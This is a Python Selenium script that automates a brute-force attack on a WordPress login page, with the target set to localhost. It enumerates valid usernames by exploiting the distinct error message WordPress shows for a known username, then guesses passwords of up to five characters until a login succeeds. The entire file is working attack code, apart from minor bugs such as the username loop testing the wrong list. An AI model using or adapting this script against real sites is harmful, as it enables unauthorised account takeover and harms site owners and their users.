from selenium import webdriver
import random, string, time

browser = webdriver.Chrome(executable_path="/Users/Luke/Desktop/chromedriver")

# change the url here
url='localhost/wp-admin.php'

browser.get(url)

def id_generator(size, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

pwVisited = []
userVisited = []
userFound = 0
passwordFound = 0

def guessUsername(digit,possibilities):
    while len(pwVisited)<possibilities:
        user = id_generator(digit,"123456789abcdefghijklmnopqrstuvwxyz")
        if user not in userVisited:
            userVisited.append(user)
        else:
            continue
        browser.find_element_by_xpath("//*[@id='user_login']").clear()
        browser.find_element_by_xpath("//*[@id='user_login']").send_keys(user)
        browser.find_element_by_xpath("//*[@id='user_pass']").send_keys("1")
        browser.find_element_by_xpath("//*[@id='wp-submit']").click()
        time.sleep(0.1)

        # if username is in the database, it would show different messages
        if "for the username" in str(browser.find_element_by_xpath("//*[@id='login_error']").text):
            print("Username is",user)
            global userFound
            userFound = 1
            break

def guessPassword(digit, possibilities):
    while len(pwVisited)<possibilities:
        password = id_generator(digit,"0123456789abcdefghijklmnopqrstuvwxyz")
        if password not in pwVisited:
            pwVisited.append(password)
        else:
            continue
        try:
            browser.find_element_by_xpath("//*[@id='user_pass']").send_keys(password)
            browser.find_element_by_xpath("//*[@id='wp-submit']").click()
            time.sleep(0.2)
        except:
            print("Password is", pwVisited[-2])
            global passwordFound
            passwordFound = 1
            break
    pwVisited.clear()

# specify the length of username in the range
for digit in range(1,6):
    guessUsername(digit,36**digit)
    if userFound == 1:
        break

# specify the length of password in the range
for digit in range(1,6):
    guessPassword(digit,36**digit)
    if passwordFound == 1:
        break
